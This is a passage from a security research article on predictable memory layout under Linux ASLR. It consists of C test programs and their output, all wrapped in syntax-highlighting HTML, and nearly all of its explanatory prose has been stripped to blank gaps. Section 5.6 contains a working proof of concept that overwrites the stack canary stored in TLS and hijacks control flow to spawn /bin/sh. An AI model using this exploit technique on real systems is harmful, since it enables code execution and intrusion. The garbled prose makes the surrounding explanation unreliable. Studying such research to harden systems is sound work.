class="hljs-number">0x00007fbfaf53a000</span></span>) libc.so.<span class="hljs-number"><span class="hljs-number">6</span></span> =&gt; <span class="hljs-regexp"><span class="hljs-regexp">/lib/x</span></span>86_64-linux-gnu/libc.so.<span class="hljs-number"><span class="hljs-number">6</span></span> (<span class="hljs-number"><span class="hljs-number">0x00007fbfaf14d000</span></span>) /lib64/ld-linux-x86-<span class="hljs-number"><span class="hljs-number">64</span></span>.so.<span class="hljs-number"><span class="hljs-number">2</span></span> (<span class="hljs-number"><span class="hljs-number">0x000055dda45e6000</span></span>)</code> </pre> <br><p>           <i>evil_elf</i> . </p><br><p>   MAP_FIXED      Linux  (25),        . </p><br><h3> 4.8    </h3><br><p>  glibc     ,         ASLR ‚Äî         .      :        ,      .     glibc    ,       ,   .      <i>mmap</i>          ,     .                ,           .  ,     ,       ,        . </p><br><p>       :           .          ,      ,   .         . </p><br><h2> 5.  </h2><br><p> ,   ,    <i>mmap</i> .  ,         . </p><br><p>    ,    . </p><br><h3> 5.1 C   </h3><br><p>         <i>pthread_create</i>        .  Source: </p><br><pre> <code class="hljs cpp"><span class="hljs-keyword"><span class="hljs-keyword">int</span></span> * p_a = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> * p_b = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> *</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">first</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *x)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> a = (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)x; p_a = &amp;a; sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> *</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">second</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *x)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> b = (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)x; p_b = &amp;b; sleep(<span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">pthread_t</span></span> one, two; pthread_create(&amp;one, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;first, <span class="hljs-number"><span class="hljs-number">0</span></span>); pthread_create(&amp;two, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;second, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *val; pthread_join(one,&amp;val); pthread_join(two, &amp;val); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Diff: 0x%x\n"</span></span>, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)p_a - (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)p_b); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"first thread stack variable: %p second thread stack vairable: %p\n"</span></span>, p_a, p_b); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./threads_stack_constant <span class="hljs-symbol"><span class="hljs-symbol">Diff:</span></span> <span class="hljs-number"><span class="hljs-number">0x801000</span></span> first thread stack <span class="hljs-symbol"><span class="hljs-symbol">variable:</span></span> <span class="hljs-number"><span class="hljs-number">0x7facdf356f44</span></span> second thread stack <span class="hljs-symbol"><span class="hljs-symbol">vairable:</span></span> <span class="hljs-number"><span class="hljs-number">0x7facdeb55f44</span></span></code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./threads_stack_constant <span class="hljs-symbol"><span class="hljs-symbol">Diff:</span></span> <span class="hljs-number"><span class="hljs-number">0x801000</span></span> first thread stack <span class="hljs-symbol"><span class="hljs-symbol">variable:</span></span> <span class="hljs-number"><span class="hljs-number">0x7f360cebef44</span></span> second thread stack <span class="hljs-symbol"><span class="hljs-symbol">vairable:</span></span> <span class="hljs-number"><span class="hljs-number">0x7f360c6bdf44</span></span></code> </pre> <br><p>  ,         .      'Diff',      .                     ‚Äî    ALSR. </p><br><h3> 5.2     ,    malloc </h3><br><p>           malloc    .    ,  malloc,       .  Source: </p><br><pre> <code class="hljs cpp"><span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *ptr; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> * </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">first</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *x)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> a = (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)x; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> *p_a = &amp;a; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> pid = getpid(); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Diff:%lx\nmalloc: %p, stack: %p\n"</span></span>, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr - (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)p_a, ptr, p_a); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">pthread_t</span></span> one; ptr = <span class="hljs-built_in"><span class="hljs-built_in">malloc</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span> * <span class="hljs-number"><span class="hljs-number">4096</span></span> * <span class="hljs-number"><span class="hljs-number">4096</span></span> - <span class="hljs-number"><span class="hljs-number">64</span></span>); pthread_create(&amp;one, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;first, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *val; pthread_join(one,&amp;val); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><p><br>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./big_heap_thread_stack_constant <span class="hljs-symbol"><span class="hljs-symbol">Diff:</span></span><span class="hljs-number"><span class="hljs-number">11</span></span>ec <span class="hljs-symbol"><span class="hljs-symbol">malloc:</span></span> <span class="hljs-number"><span class="hljs-number">0x7f4374ab2010</span></span>, <span class="hljs-symbol"><span class="hljs-symbol">stack:</span></span> <span class="hljs-number"><span class="hljs-number">0x7f4374ab0e24</span></span></code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./big_heap_thread_stack_constant <span class="hljs-symbol"><span class="hljs-symbol">Diff:</span></span><span class="hljs-number"><span class="hljs-number">11</span></span>ec <span class="hljs-symbol"><span class="hljs-symbol">malloc:</span></span> <span class="hljs-number"><span class="hljs-number">0x7f9b00d4b010</span></span>, <span class="hljs-symbol"><span class="hljs-symbol">stack:</span></span> <span class="hljs-number"><span class="hljs-number">0x7f9b00d49e24</span></span></code> </pre> <br><p>  ,  ‚Äî .              ,   malloc,     ‚Äî     ASLR. </p><br><h3> 5.3 mmap    <br></h3><br><p>     mmap      <i>pthread_create</i> .    ,   mmap,       .  Source: <br></p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> * </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">first</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *x)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> a = (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)x; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> *p_a = &amp;a; <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *ptr = mmap(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span> * <span class="hljs-number"><span class="hljs-number">4096</span></span> *<span class="hljs-number"><span class="hljs-number">4096</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>, MAP_ANON | MAP_PRIVATE, <span class="hljs-number"><span class="hljs-number">-1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"%lx\n%p, %p\n"</span></span>, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)p_a - (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr, ptr, p_a); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">pthread_t</span></span> one; pthread_create(&amp;one, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;first, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *val; pthread_join(one,&amp;val); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre><br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./thread_stack_mmap_constant <span class="hljs-number"><span class="hljs-number">87</span></span>fff34 <span class="hljs-number"><span class="hljs-number">0x7f35b0e3d000</span></span>, <span class="hljs-number"><span class="hljs-number">0x7f35b963cf34</span></span></code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./thread_stack_mmap_constant <span class="hljs-number"><span class="hljs-number">87</span></span>fff34 <span class="hljs-number"><span class="hljs-number">0x7f5a1083f000</span></span>, <span class="hljs-number"><span class="hljs-number">0x7f5a1903ef34</span></span></code> </pre> <br><p>  .          ,   mmap,     ‚Äî     ASLR. </p><br><h3> 5.4 mmap  TLS   <br></h3><br><p>     mmap    TLS  .     . ,   ¬´¬ª         TLS.  Source: </p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> argc, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> **argv, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> **envp)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> res; <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> buffer[<span class="hljs-number"><span class="hljs-number">256</span></span>]; <span class="hljs-built_in"><span class="hljs-built_in">sprintf</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"%.255s"</span></span>,argv[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> * frame = __builtin_frame_address(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> * tls; res = arch_prctl(ARCH_GET_FS, &amp;tls); <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> * addr = mmap(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span> * <span class="hljs-number"><span class="hljs-number">4096</span></span> *<span class="hljs-number"><span class="hljs-number">4096</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>, MAP_ANON | MAP_PRIVATE, <span class="hljs-number"><span class="hljs-number">-1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (addr == MAP_FAILED) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">-1</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"TLS %p , FRAME %p\n"</span></span>, tls, frame); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">" stack cookie: 0x%lx, from tls 0x%lx\n"</span></span>, frame[<span class="hljs-number"><span class="hljs-number">-1</span></span>], tls[<span class="hljs-number"><span class="hljs-number">5</span></span>]); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"from mmap to TLS: 0x%lx\n"</span></span>, (<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *)tls - (<span class="hljs-keyword"><span class="hljs-keyword">char</span></span>*)addr); <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> diff = tls - addr; <span class="hljs-keyword"><span class="hljs-keyword">tcbhead_t</span></span> *head = (<span class="hljs-keyword"><span class="hljs-keyword">tcbhead_t</span></span>*)&amp;addr[diff]; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"cookie from addr: 0x%lx\n"</span></span>, head-&gt;stack_guard); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"cookie == stack_cookie? %d\n"</span></span>, head-&gt;stack_guard == frame[<span class="hljs-number"><span class="hljs-number">-1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./mmap_tls_constant TLS <span class="hljs-number"><span class="hljs-number">0x7f520540c700</span></span> , FRAME <span class="hljs-number"><span class="hljs-number">0x7ffed15ba130</span></span> stack <span class="hljs-symbol"><span class="hljs-symbol">cookie:</span></span> <span class="hljs-number"><span class="hljs-number">0x94905ec857965c00</span></span>, from tls <span class="hljs-number"><span class="hljs-number">0x94905ec857965c00</span></span> from mmap to <span class="hljs-symbol"><span class="hljs-symbol">TLS:</span></span> <span class="hljs-number"><span class="hljs-number">0x85c8700</span></span> cookie from <span class="hljs-symbol"><span class="hljs-symbol">addr:</span></span> <span class="hljs-number"><span class="hljs-number">0x94905ec857965c00</span></span> cookie == stack_cookie? <span class="hljs-literal"><span class="hljs-literal">true</span></span></code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./mmap_tls_constant TLS <span class="hljs-number"><span class="hljs-number">0x7f6d4a081700</span></span> , FRAME <span class="hljs-number"><span class="hljs-number">0x7ffe8508a2f0</span></span> stack <span class="hljs-symbol"><span class="hljs-symbol">cookie:</span></span> <span class="hljs-number"><span class="hljs-number">0x51327792302d5300</span></span>, from tls <span class="hljs-number"><span class="hljs-number">0x51327792302d5300</span></span> from mmap to <span class="hljs-symbol"><span class="hljs-symbol">TLS:</span></span> <span class="hljs-number"><span class="hljs-number">0x85c8700</span></span> cookie from <span class="hljs-symbol"><span class="hljs-symbol">addr:</span></span> <span class="hljs-number"><span class="hljs-number">0x51327792302d5300</span></span> cookie == stack_cookie? <span class="hljs-literal"><span class="hljs-literal">true</span></span></code> </pre> <br><p>  ,       ,   ¬´¬ª .  ,        ¬´¬ª    .  ‚Äî         ,          mmap .       <b>0x85c8700</b> .      ASLR  ¬´¬ª. </p><br><h3> 5.5 mmap  glibc </h3><br><p>        4.2,    :    mmap         ¬´system¬ª  ¬´execv¬ª   glibc ‚Äî  : </p><br><pre> <code class="hljs pgsql"><span class="hljs-type"><span class="hljs-type">int</span></span> main(<span class="hljs-type"><span class="hljs-type">int</span></span> argc, <span class="hljs-type"><span class="hljs-type">char</span></span> **argv, <span class="hljs-type"><span class="hljs-type">char</span></span> **envp) { <span class="hljs-type"><span class="hljs-type">int</span></span> res; <span class="hljs-keyword"><span class="hljs-keyword">system</span></span>(""); // <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> make lazy linking execv("", <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>); // <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> make lazy linking unsigned long addr = (unsigned long)mmap(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span> * <span class="hljs-number"><span class="hljs-number">4096</span></span> *<span class="hljs-number"><span class="hljs-number">4096</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>, MAP_ANON | MAP_PRIVATE, <span class="hljs-number"><span class="hljs-number">-1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (addr == MAP_FAILED) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">-1</span></span>; unsigned long addr_system = (unsigned long)dlsym(RTLD_NEXT, "system"); unsigned long addr_execv = (unsigned long)dlsym(RTLD_NEXT, "execv"); printf("addr %lx system %lx execv %lx\n", addr, addr_system, addr_execv); printf("system - addr %lx execv - addr %lx\n", addr_system - addr, addr_execv - addr); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./mmap_libc addr <span class="hljs-number"><span class="hljs-number">7</span></span>f02e9f8500<span class="hljs-number"><span class="hljs-number">0</span></span> system <span class="hljs-number"><span class="hljs-number">7</span></span>f02f1fca39<span class="hljs-number"><span class="hljs-number">0</span></span> execv <span class="hljs-number"><span class="hljs-number">7</span></span>f02f205186<span class="hljs-number"><span class="hljs-number">0</span></span> system - addr <span class="hljs-number"><span class="hljs-number">8045390</span></span> execv - addr <span class="hljs-number"><span class="hljs-number">80</span></span>cc86<span class="hljs-number"><span class="hljs-number">0</span></span></code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./mmap_libc addr <span class="hljs-number"><span class="hljs-number">7</span></span>f534809c00<span class="hljs-number"><span class="hljs-number">0</span></span> system <span class="hljs-number"><span class="hljs-number">7</span></span>f53500e139<span class="hljs-number"><span class="hljs-number">0</span></span> execv <span class="hljs-number"><span class="hljs-number">7</span></span>f535016886<span class="hljs-number"><span class="hljs-number">0</span></span> system - addr <span class="hljs-number"><span class="hljs-number">8045390</span></span> execv - addr <span class="hljs-number"><span class="hljs-number">80</span></span>cc86<span class="hljs-number"><span class="hljs-number">0</span></span></code> </pre> <br><p>  ,       .      ASLR,      ,   mmap.          ,    ,        . </p><br><h3> 5.6       </h3><br><p>          TLS-.      ,    ¬´¬ª  TLS,      .       ‚Äî         . <br>    0x41.  : </p><br><pre> <code class="hljs pgsql"><span class="hljs-type"><span class="hljs-type">void</span></span> pwn_payload() { <span class="hljs-type"><span class="hljs-type">char</span></span> *argv[<span class="hljs-number"><span class="hljs-number">2</span></span>] = {"/bin/sh", <span class="hljs-number"><span class="hljs-number">0</span></span>}; execve(argv[<span class="hljs-number"><span class="hljs-number">0</span></span>], argv, <span class="hljs-number"><span class="hljs-number">0</span></span>); } <span class="hljs-type"><span class="hljs-type">int</span></span> fixup = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-type"><span class="hljs-type">void</span></span> * first(<span class="hljs-type"><span class="hljs-type">void</span></span> *x) { unsigned long *addr; arch_prctl(ARCH_GET_FS, &amp;addr); printf("thread FS %p\n", addr); printf("cookie thread: 0x%lx\n", addr[<span class="hljs-number"><span class="hljs-number">5</span></span>]); unsigned long * frame = __builtin_frame_address(<span class="hljs-number"><span class="hljs-number">0</span></span>); printf("stack_cookie addr %p \n", &amp;frame[<span class="hljs-number"><span class="hljs-number">-1</span></span>]); printf("diff : %lx\n", (<span class="hljs-type"><span class="hljs-type">char</span></span>*)addr - (<span class="hljs-type"><span class="hljs-type">char</span></span>*)&amp;frame[<span class="hljs-number"><span class="hljs-number">-1</span></span>]); unsigned long len =(unsigned long)( (<span class="hljs-type"><span class="hljs-type">char</span></span>*)addr - (<span class="hljs-type"><span class="hljs-type">char</span></span>*)&amp;frame[<span class="hljs-number"><span class="hljs-number">-1</span></span>]) + fixup; // example <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> exploitation // <span class="hljs-keyword"><span class="hljs-keyword">prepare</span></span> exploit <span class="hljs-type"><span class="hljs-type">void</span></span> *exploit = malloc(len); memset(exploit, <span class="hljs-number"><span class="hljs-number">0x41</span></span>, len); <span class="hljs-type"><span class="hljs-type">void</span></span> *ptr = &amp;pwn_payload; memcpy((<span class="hljs-type"><span class="hljs-type">char</span></span>*)exploit + <span class="hljs-number"><span class="hljs-number">16</span></span>, &amp;ptr, <span class="hljs-number"><span class="hljs-number">8</span></span>); // exact stack-buffer overflow example memcpy(&amp;frame[<span class="hljs-number"><span class="hljs-number">-1</span></span>], exploit, len); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span class="hljs-type"><span class="hljs-type">int</span></span> main(<span class="hljs-type"><span class="hljs-type">int</span></span> argc, <span class="hljs-type"><span class="hljs-type">char</span></span> **argv, <span class="hljs-type"><span class="hljs-type">char</span></span> **envp) { pthread_t one; unsigned long *addr; <span class="hljs-type"><span class="hljs-type">void</span></span> *val; arch_prctl(ARCH_GET_FS, &amp;addr); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (argc &gt; <span class="hljs-number"><span class="hljs-number">1</span></span>) fixup = <span class="hljs-number"><span class="hljs-number">0x30</span></span>; printf("main FS %p\n", addr); printf("cookie main: 0x%lx\n", addr[<span class="hljs-number"><span class="hljs-number">5</span></span>]); pthread_create(&amp;one, <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>, &amp;first, <span class="hljs-number"><span class="hljs-number">0</span></span>); pthread_join(one,&amp;val); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><p>                  .      ¬´¬ª: </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./thread_stack_tls main FS <span class="hljs-number"><span class="hljs-number">0x7fa0e8615700</span></span> cookie <span class="hljs-symbol"><span class="hljs-symbol">main:</span></span> <span class="hljs-number"><span class="hljs-number">0xb5b15744571fd00</span></span> thread FS <span class="hljs-number"><span class="hljs-number">0x7fa0e7e2f700</span></span> cookie <span class="hljs-symbol"><span class="hljs-symbol">thread:</span></span> <span class="hljs-number"><span class="hljs-number">0xb5b15744571fd00</span></span> stack_cookie addr <span class="hljs-number"><span class="hljs-number">0x7fa0e7e2ef48</span></span> diff : <span class="hljs-number"><span class="hljs-number">7</span></span>b8 *** stack smashing detected ***: ./thread_stack_tls terminated Aborted (core dumped)</code> </pre> <br><p>       ¬´¬ª,    <i>pwn_payload</i> ,    sh. </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./thread_stack_tls <span class="hljs-number"><span class="hljs-number">1</span></span> main FS <span class="hljs-number"><span class="hljs-number">0x7f4d94b75700</span></span> cookie <span class="hljs-symbol"><span class="hljs-symbol">main:</span></span> <span class="hljs-number"><span class="hljs-number">0x2ad951d602d94100</span></span> thread FS <span class="hljs-number"><span class="hljs-number">0x7f4d94385700</span></span> cookie <span class="hljs-symbol"><span class="hljs-symbol">thread:</span></span> <span class="hljs-number"><span class="hljs-number">0x2ad951d602d94100</span></span> stack_cookie addr <span class="hljs-number"><span class="hljs-number">0x7f4d94384f48</span></span> diff : <span class="hljs-number"><span class="hljs-number">7</span></span>b8 $ ^D blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$</code> </pre> <br><p>          .           ,     ¬´¬ª.         0x7b8+0x30 ,   2024 . </p><br><h3> 5.7      ,    malloc </h3><br><p>   ,       malloc         .  Source: </p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> * </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">first</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *x)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> a = (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)x; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> *p_a = &amp;a; <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *ptr; ptr = <span class="hljs-built_in"><span class="hljs-built_in">malloc</span></span>(<span class="hljs-number"><span class="hljs-number">8</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"%lx\n%p, %p\n"</span></span>, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr - (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)p_a, ptr, p_a); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span 